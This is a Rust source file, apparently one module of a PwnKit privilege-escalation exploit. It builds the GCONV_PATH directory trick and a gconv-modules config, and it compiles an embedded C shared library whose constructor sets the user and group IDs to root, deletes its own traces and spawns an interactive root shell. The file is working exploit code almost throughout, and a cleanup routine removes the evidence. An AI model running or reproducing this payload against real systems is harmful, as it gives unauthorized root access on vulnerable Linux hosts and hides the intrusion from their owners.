//! Payload setup for PwnKit
//!
//! Creates:
//! 1. Directory: "GCONV_PATH=."
//! 2. Executable: "GCONV_PATH=./pwnkit" (empty, just needs +x)
//! 3. Directory: "pwnkit" (for gconv modules)
//! 4. File: "pwnkit/gconv-modules" (config for iconv)
//! 5. Shared library: "pwnkit/pwnkit.so" (payload)

use std::fs::{self, File, OpenOptions};
use std::io::Write;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;
use log::{debug, info};

/// The malicious shared library source (C code)
/// This will be compiled at runtime
const PAYLOAD_SO_SOURCE: &str = r#"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

// Stub functions for gconv (not actually called)
void gconv() {}
void gconv_init() {}

// Constructor runs when .so is loaded
__attribute__((constructor))
void pwn(void) {
    // Use setreuid/setregid for reliable privilege restoration
    // This ensures both real and effective UIDs become root
    if (setreuid(0, 0) != 0) {
        // Fallback
        setuid(0);
    }
    if (setregid(0, 0) != 0) {
        setgid(0);
    }
    
    // Clean up payload files before spawning shell
    unlink("GCONV_PATH=./pwnkit");
    rmdir("GCONV_PATH=.");
    unlink("pwnkit/pwnkit.so");
    unlink("pwnkit/gconv-modules");
    rmdir("pwnkit");

    // Verify we are root
    if (getuid() != 0) {
        // Failed to get root
        return;
    }

    // Spawn root shell
    // Using -i for interactive, -p to preserve privileges
    char *args[] = {"/bin/sh", "-i", NULL};
    char *envp[] = {"PATH=/usr/bin:/bin", "HOME=/root", NULL};
    execve("/bin/sh", args, envp);
}
"#;

/// gconv-modules configuration to load our payload
const GCONV_MODULES_CONTENT: &str = r#"
module  PWNKIT//    INTERNAL        pwnkit          2
module  INTERNAL    PWNKIT//        pwnkit          2
"#;

pub fn setup() -> Result<(), String> {
    let cwd = std::env::current_dir()
        .map_err(|e| format!("getcwd: {}", e))?;
    
    debug!("[Payload] Working directory: {:?}", cwd);

    // Step 1: Create "GCONV_PATH=." directory
    let gconv_dir = "GCONV_PATH=.";
    if !Path::new(gconv_dir).exists() {
        fs::create_dir(gconv_dir)
            .map_err(|e| format!("mkdir '{}': {}", gconv_dir, e))?;
    }

    // Step 2: Create empty executable "GCONV_PATH=./pwnkit"
    let pwnkit_exec = "GCONV_PATH=./pwnkit";
    {
        File::create(pwnkit_exec)
            .map_err(|e| format!("touch '{}': {}", pwnkit_exec, e))?;
        
        let mut perms = fs::metadata(pwnkit_exec)
            .map_err(|e| format!("stat '{}': {}", pwnkit_exec, e))?
            .permissions();
        perms.set_mode(0o755);
        fs::set_permissions(pwnkit_exec, perms)
            .map_err(|e| format!("chmod '{}': {}", pwnkit_exec, e))?;
    }

    // Step 3: Create "pwnkit" directory for gconv modules
    let pwnkit_dir = "pwnkit";
    if !Path::new(pwnkit_dir).exists() {
        fs::create_dir(pwnkit_dir)
            .map_err(|e| format!("mkdir '{}': {}", pwnkit_dir, e))?;
    }

    // Step 4: Create gconv-modules config
    let gconv_modules_path = "pwnkit/gconv-modules";
    {
        let mut f = File::create(gconv_modules_path)
            .map_err(|e| format!("create '{}': {}", gconv_modules_path, e))?;
        f.write_all(GCONV_MODULES_CONTENT.as_bytes())
            .map_err(|e| format!("write '{}': {}", gconv_modules_path, e))?;
    }

    // Step 5: Compile malicious .so
    compile_payload_so()?;

    info!("[Payload] Setup complete");
    Ok(())
}

fn compile_payload_so() -> Result<(), String> {
    let c_file = "pwnkit/pwnkit.c";
    let so_file = "pwnkit/pwnkit.so";

    // Write C source
    {
        let mut f = File::create(c_file)
            .map_err(|e| format!("create '{}': {}", c_file, e))?;
        f.write_all(PAYLOAD_SO_SOURCE.as_bytes())
            .map_err(|e| format!("write '{}': {}", c_file, e))?;
    }

    // Compile with gcc
    // Flags: -shared (make .so), -fPIC (position independent), -o output
    let output = std::process::Command::new("gcc")
        .args(&["-shared", "-fPIC", "-o", so_file, c_file, "-nostartfiles"])
        .output()
        .map_err(|e| format!("gcc failed: {}", e))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(format!("gcc error: {}", stderr));
    }

    // Remove C source (cleanup)
    let _ = fs::remove_file(c_file);

    debug!("[Payload] Compiled {}", so_file);
    Ok(())
}

pub fn cleanup() {
    let _ = fs::remove_file("GCONV_PATH=./pwnkit");
    let _ = fs::remove_dir("GCONV_PATH=.");
    let _ = fs::remove_file("pwnkit/pwnkit.so");
    let _ = fs::remove_file("pwnkit/pwnkit.c");
    let _ = fs::remove_file("pwnkit/gconv-modules");
    let _ = fs::remove_dir("pwnkit");
}
